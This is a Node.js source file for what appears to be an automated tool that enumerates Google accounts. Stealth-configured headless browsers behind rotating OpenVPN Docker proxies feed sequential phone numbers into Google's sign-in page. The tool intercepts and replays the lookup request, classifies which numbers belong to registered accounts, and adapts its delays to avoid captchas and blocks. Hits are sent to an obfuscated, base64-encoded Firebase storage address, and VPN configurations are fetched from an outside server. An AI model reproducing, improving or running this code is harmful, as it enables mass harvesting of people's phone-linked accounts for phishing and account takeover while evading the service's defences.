const StealthPlugin = require('puppeteer-extra-plugin-stealth')
const { execFile } = require('child_process')
const puppeteer = require('puppeteer-extra')
const axios = require('axios')
const path = require('path')
const util = require('util')
const fs = require('fs')
const os = require('os')

let USER = process.argv.slice(2)[0]
let ENC_KEY = process.argv.slice(2)[1]
let ENC_IV = process.argv.slice(2)[2]

let mConfig = null
let mNumber = 0
let mTarget = 0
let mPage = []
let mProxy = []
let mRequest = []
let mCapture = []
let mFirstReq = []
let mDelayControll = []
let mStart = Date.now()

let STORAGE = decode('aHR0cHM6Ly9maXJlYmFzZXN0b3JhZ2UuZ29vZ2xlYXBpcy5jb20vdjAvYi9kYXRhYmFzZTA4OC5hcHBzcG90LmNvbS9vLw==')

puppeteer.use(StealthPlugin())

process.setMaxListeners(20)

process.on('message', async (data) => {
    try {
        let json = (typeof data === 'string') ? JSON.parse(data) : data
        if (json.t == 1) {
            mConfig = json
        } else if (json.t == 2) {
            let running = mConfig != null
            process.send({ t: 3, s: 'controller_status', d: { t:2, r:running, u:json.u, s:USER, a:parseInt((Date.now()-mStart)/1000) } })
        }
    } catch (error) {}
})


class Proxy {
    static CONFIG = {
        workDir: '.vpn-work',
        imageName: 'vpn-proxy',
        containerPrefix: 'openvpn-',
        connectTimeoutSec: 120
    }

    constructor() {
        fs.mkdirSync(path.resolve(Proxy.CONFIG.workDir), { recursive: true })
    }

    static sleep(ms) {
        return new Promise((r) => setTimeout(r, ms))
    }

    static async execFileP(cmd, args, opts = {}) {
        let fn = util.promisify(execFile)
        let { stdout } = await fn(cmd, args, { maxBuffer: 20 * 1024 * 1024, ...opts })
        return stdout
    }

    static async docker(args, opts = {}) {
        return await Proxy.execFileP('docker', args, opts)
    }

    static async getIpViaProxy(port, timeoutMs = 10000) {
        try {
            let response = await axios.get('https://api.ipify.org?format=json', {
                proxy: {
                    protocol: 'http',
                    host: '127.0.0.1',
                    port: port
                },
                timeout: timeoutMs
            })

            if (response.data && response.data.ip) {
                return response.data.ip
            } else {
                throw new Error('Invalid response format from ipify');
            }
        } catch (error) {
            throw new Error(`Proxy IP check failed: ${error.message}`);
        }
    }

    async buildImage() {
        if (process.platform !== 'linux') {
            return
        }
        let dir = path.resolve(Proxy.CONFIG.workDir)
        fs.writeFileSync(
            path.join(dir, 'Dockerfile'),
            'FROM alpine:latest\nRUN apk add --no-cache openvpn curl iproute2 tinyproxy\n'
        )
        fs.writeFileSync(
            path.join(dir, 'tinyproxy.conf'),
            ['Port 8888', 'Listen 0.0.0.0', 'Timeout 600', 'Allow 0.0.0.0/0', 'DisableViaHeader Yes', 'LogLevel Info', 'MaxClients 50', ''].join('\n')
        )
        await Proxy.docker(['build', '-q', '-t', Proxy.CONFIG.imageName, dir])
    }

    async connect(ovpnContentString, port, index = 1) {
        let name = `${Proxy.CONFIG.containerPrefix}${index}`
        let startTime = Date.now()
        let result = {
            name,
            port,
            status: false,
            ip: null,
            time: 0,
            error: null,
        }

        if (process.platform !== 'linux') {
            return result
        }

        let tempOvpnPath = path.resolve(Proxy.CONFIG.workDir, `client-${index}.ovpn`)

        try {
            await Proxy.docker(['stop', name]).catch(() => {})
            await Proxy.docker(['rm', '-f', name]).catch(() => {})

            fs.writeFileSync(tempOvpnPath, ovpnContentString)

            await Proxy.docker([
                'run', '-d',
                '--name', name,
                '--privileged',
                '--cap-add=NET_ADMIN',
                '--device', '/dev/net/tun',
                '--dns', '8.8.8.8', '--dns', '1.1.1.1',
                '-p', `127.0.0.1:${port}:8888`,
                '-v', `${tempOvpnPath}:/etc/openvpn/client.ovpn:ro`,
                '-v', `${path.resolve(Proxy.CONFIG.workDir, 'tinyproxy.conf')}:/etc/tinyproxy/custom.conf:ro`,
                Proxy.CONFIG.imageName,
                'openvpn', '--config', '/etc/openvpn/client.ovpn',
            ])

            let deadline = Date.now() + Proxy.CONFIG.connectTimeoutSec * 1000
            let connected = false
            
            while (Date.now() < deadline) {
                let rawLogs = await Proxy.execFileP('docker', ['logs', name]).catch(() => '')
                
                if (rawLogs.includes('Initialization Sequence Completed')) {
                    connected = true
                    break
                }
                
                let running = (await Proxy.docker(['inspect', '-f', '{{.State.Running}}', name])).trim()
                if (running !== 'true') throw new Error('Container exited early')
                await Proxy.sleep(2000)
            }

            if (!connected) throw new Error('VPN connection timeout')

            await Proxy.docker(['exec', name, 'sh', '-c', 'printf "nameserver 1.1.1.1\\nnameserver 8.8.8.8\\n" > /etc/resolv.conf'])
            await Proxy.docker(['exec', '-d', name, 'tinyproxy', '-d', '-c', '/etc/tinyproxy/custom.conf'])
            await Proxy.sleep(2000)

            let proxyIp = await Proxy.getIpViaProxy(port)

            result.status = true
            result.ip = proxyIp
            result.time = Number(((Date.now() - startTime) / 1000).toFixed(2))
        } catch (error) {
            result.error = error.message
            result.time = Number(((Date.now() - startTime) / 1000).toFixed(2))
        }

        return result
    }

    async cleanup(name) {
        await Proxy.docker(['stop', name]).catch(() => {})
        await Proxy.docker(['rm', '-f', name]).catch(() => {})
    }
}

class AdaptiveDelay {
    constructor({minDelay = 1000, maxDelay = 3000, step = 200, incCooldown = 5000} = {}) {
        this.delay = minDelay
        this.minDelay = minDelay
        this.maxDelay = maxDelay
        this.step = step

        this.incCooldown = incCooldown

        this.lastIncTime = 0

        this.lastSignalCount = 0
        this.lastSignalTime = 0
    }

    update(signalCount) {
        if (signalCount == 0) {
            return this.delay
        }

        let now = Date.now()

        if (signalCount > this.lastSignalCount) {
            if (now - this.lastIncTime < this.incCooldown) {
                return this.delay
            }

            this.delay = Math.min(this.delay + this.step, this.maxDelay)
            this.lastIncTime = now
        }

        this.lastSignalCount = signalCount
        this.lastSignalTime = now

        return this.delay
    }
}

startServer()


async function startServer() {
    let mProxyManager = new Proxy()

    let cpu = getSystemCpuUsage()
    let ram = getSystemRamUsage()
    console.log(`System CPU: ${cpu}%`)
    console.log(`System RAM: ${ram.usedPercent}% (${ram.usedMB} MB / ${ram.totalMB} MB)`)

    await mProxyManager.buildImage()
    console.log('Build Success')

    mCapture.push(0)
    mDelayControll.push(new AdaptiveDelay())

    let vpnConfig = await getVpnConfig(USER, ENC_KEY, ENC_IV)

    if(vpnConfig) {
        console.log('--------------------------------')
        
        for (let i = 0; i < vpnConfig.length; i++) {
            mCapture.push(0)
            mDelayControll.push(new AdaptiveDelay())
            let result = await mProxyManager.connect(vpnConfig[i].config, 8888+i, i+1)
            if (result.status) {
                mProxy.push('http://127.0.0.1:'+result.port)
                console.log('Proxy Name: '+result.name)
                console.log('IP Address:', result.ip)
                console.log('Load Time: '+result.time+'s')
                console.log('--------------------------------')
            } else {
                console.log('Proxy Name: '+result.name)
                console.log('Error Msg: '+result.error)
                console.log('Load Time: '+result.time+'s')
                console.log('--------------------------------')
            }
        }
    }

    await startBrowser(null)

    for (let i = 0; i < mProxy.length; i++) {
        await startBrowser(mProxy[i])
    }

    await foundLoginNumber()
}

async function startBrowser(proxy) {
    try {
        let args = [
            '--no-sandbox',
            '--disable-notifications',
            '--disable-setuid-sandbox',
            '--ignore-certificate-errors',
            '--ignore-certificate-errors-skip-list',
            '--disable-dev-shm-usage'
        ]

        if (proxy) {
            args.push('--proxy-server=' + proxy)
        }

        let browser = await puppeteer.launch({
            headless: false,
            headless: 'new',
            args: args
        })

        let page = (await browser.pages())[0]

        page.on('dialog', async dialog => dialog.type() == "beforeunload" && dialog.accept())

        await page.setRequestInterception(true)

        let id = mPage.length

        page.on('request', async request => {
            try {
                let url = request.url()
                if (url.startsWith('https://accounts.google.com/v3/signin/_/AccountsSignInUi/data/batchexecute?rpcids=MI613e') && !url.endsWith('request=manually')) {
                    try {
                        if (mRequest[id]) {
                            mRequest[id].resolve({
                                url: url,
                                headers: request.headers(),
                                postData: request.postData()
                            })
                            delete mRequest[id]
                        }
                    } catch (error) {}
                    
                    let contentType = 'application/json; charset=utf-8'
                    let output = decode('KV19JwoKMTk1CltbIndyYi5mciIsIlYxVW1VZSIsIltudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsWzExXV0iLG51bGwsbnVsbCxudWxsLCJnZW5lcmljIl0sWyJkaSIsNThdLFsiYWYuaHR0cHJtIiw1OCwiLTI1OTg0NDI2NDQ4NDcyOTY2MTMiLDY1XV0KMjUKW1siZSIsNCxudWxsLG51bGwsMjMxXV0K')

                    request.respond({
                        ok: true,
                        status: 200,
                        contentType,
                        body: output,
                    })
                } else {
                    request.continue()
                }
            } catch (error) {
                request.continue()
            }
        })
        
        await loadLoginPage(page)

        mPage.push(page)
        mFirstReq.push(true)

        let cpu = getSystemCpuUsage()
        let ram = getSystemRamUsage()
        console.log(`Browser-${mPage.length}: CPU: ${cpu}%, RAM: ${ram.usedPercent}%`)
    } catch (error) {
        console.log(`Browser-${mPage.length} Error: ${error}`)
    }
}


async function foundLoginNumber() {
    while (true) {
        if (mConfig) {
            mStart = Date.now()

            mNumber = mConfig.n
            mTarget = mNumber + mConfig.s
            let result = await workerStart(Math.min(mConfig.b, mProxy.length)+1, mConfig.s)
            process.send({ t: 5, s: 'controller_status', c:USER, d: { t:1, u:mConfig.u, s:USER, f:result.f, r:result.r, c:result.c, o:result.o } })

            mConfig = null
        } else {
            await delay(1000)
        }
    }
}

async function workerStart(workerSize, target) {
    let workers = []
    let result = {
        f: 0,
        r: 0,
        c: 0,
        o: 0
    }

    let capture = {}
    let timeoutMs = target * 3000

    let shouldStop = false

    for (let i = 0; i < workerSize; i++) {
        let workerId = i

        let workerPromise = (async () => {
            let sirialError = 0
            while (true) {
                try {
                    if (shouldStop) {
                        break
                    }
                    
                    let number = mNumber++

                    if (number >= mTarget) {
                        break
                    }

                    let status = await sendRequest(number, workerId)

                    if (shouldStop) {
                        break
                    }

                    if (status == 1) {
                        result.f++
                        if (mConfig) await saveNumber(mConfig.u, mConfig.k, number)
                    } else if (status == 2) {
                        result.r++
                    } else if (status == 5) {
                        result.c++
                        let workerKey = workerId.toString()
                        mCapture[workerId] = (mCapture[workerId] || 0) + 1
                        capture[workerKey] = (capture[workerKey] || 0) + 1
                    } else if (status == 3 || status == 0) {
                        result.o++
                    }

                    if (mFirstReq[workerId] && (status == 5 || status == 3 || status == 0)) {
                        sirialError++
                        
                        if (sirialError >= 5) {
                            sirialError = 0
                            try {
                                await loadLoginPage(mPage[workerId])
                                let cpu = getSystemCpuUsage()
                                let ram = getSystemRamUsage()
                                console.log(`Page-${workerId+1} Reload: CPU: ${cpu}%, RAM: ${ram.usedPercent}%`)
                            } catch (error) {}
                        }
                    } else {
                        mFirstReq[workerId] = false
                        sirialError = 0
                    }

                    if (shouldStop) {
                        break
                    }

                    await delay(mDelayControll[workerId].update((mCapture[workerId] || 0)))
                } catch (error) {
                    break
                }
            }
        })()

        workers.push(workerPromise)
    }

    let timeoutId

    let timeoutPromise = new Promise((resolve) => {
        timeoutId = setTimeout(() => {
            shouldStop = true
            resolve()
        }, timeoutMs)
    })

    try {
        await Promise.race([
            Promise.all(workers),
            timeoutPromise
        ])
    } finally {
        if (timeoutId) clearTimeout(timeoutId)
    }

    if (result.c > 0) {
        console.log('Capture:', capture)
    }

    return result
}

async function sendRequest(number, id) {
    try {
        let requestPromise = new Promise((resolve, reject) => {
            let timer = setTimeout(() => {
                delete mRequest[id]
                resolve(null)
            }, 5000)

            mRequest[id] = {
                resolve: (data) => {
                    clearTimeout(timer)
                    resolve(data)
                }
            }
        })

        await mPage[id].evaluate((number) => {
            document.querySelector('input#identifierId').value = number
            document.querySelector('#identifierNext').click()
        }, '+'+number)

        let capturedData = await requestPromise

        if (capturedData) {
            let url = capturedData.url

            let data = await mPage[id].evaluate(async (u, h, p) => {
                let res = await fetch(u, {
                    method: 'POST',
                    headers: h,
                    body: p
                })

                return await res.text()
            }, url + (url.endsWith('&') ? '' : '&') + 'request=manually', capturedData.headers, capturedData.postData)

            try {
                let temp = data.substring(data.indexOf('[['), data.lastIndexOf(']]')-2)
                temp = temp.substring(0, temp.lastIndexOf(']]')+2)

                let json = JSON.parse(temp)[0]
                if (json[1] == 'MI613e') {
                    let value = JSON.parse(json[2])
                    if (value[21]) {
                        let values = JSON.stringify(value[21])
                        if (values.includes('/v3/signin/challenge/pwd') || values.includes('/v3/signin/rejected')) {
                            return 1
                        } else if (values.includes('/v3/signin/challenge/recaptcha')) {
                            return 2
                        }
                        return 3
                    } else if (value[18] && value[18][0]) {
                        return 5
                    } else {
                        return 4
                    }
                } else {
                    console.log(id, 'MI613e Not Found')
                }
            } catch (error) {
                console.log(id, number, 'Error: ', Buffer.from(data).toString('base64'))
            }
        } else {
            console.log(id, 'Data Not Found')
        }
    } catch (error) {
        console.log(id, number, error)
    }

    return 0
}


async function loadLoginPage(page) {
    for (let i = 0; i < 3; i++) {
        try {
            await page.goto('https://accounts.google.com/ServiceLogin?service=accountsettings&continue=https://myaccount.google.com', { timeout: 60000 })
            await delay(500)
            await page.evaluate(() => {
                let root = document.querySelector('div[class="kPY6ve"]')
                if (root) {
                    root.remove()
                }
                root = document.querySelector('div[class="Ih3FE"]')
                if (root) {
                    root.remove()
                }
            })
            break
        } catch (error) {}
    }
}

async function saveNumber(user, key, number) {
    try {
        await fetch(STORAGE+encodeURIComponent('number/'+user+'/'+key+'/'+number), {
            method: 'POST',
            body: ''
        })
    } catch (error) {}
}

async function getVpnConfig(user, key, iv) {
    try {
        let response = await axios.post('https://proxy.raiyanbd.com/get-vpn', { user, key, iv })

        if (response.data.success) {
            return Object.entries(response.data.data).map(([ip, value]) => ({
                ip,
                ...value
            }))
        }
    } catch (error) {}

    return null
}

function cpuSnapshot() {
    let cpus = os.cpus()
    let idle = 0, total = 0
    for (const cpu of cpus) {
        for (const type in cpu.times) total += cpu.times[type]
        idle += cpu.times.idle
    }
    return { idle, total }
}

function getSystemCpuUsage() {
    let { idle, total } = cpuSnapshot();
    return +(100 - (idle / total) * 100).toFixed(2)
}

function getSystemRamUsage() {
    let total = os.totalmem()
    let free = os.freemem()
    let used = total - free
    return {
        usedPercent: +((used / total) * 100).toFixed(2),
        usedMB: +(used / 1024 / 1024).toFixed(2),
        totalMB: +(total / 1024 / 1024).toFixed(2),
    }
}

function decode(data) {
    return Buffer.from(data, 'base64').toString('utf-8')
}

function delay(time) {
    return new Promise(function(resolve) {
        setTimeout(resolve, time)
    })
}
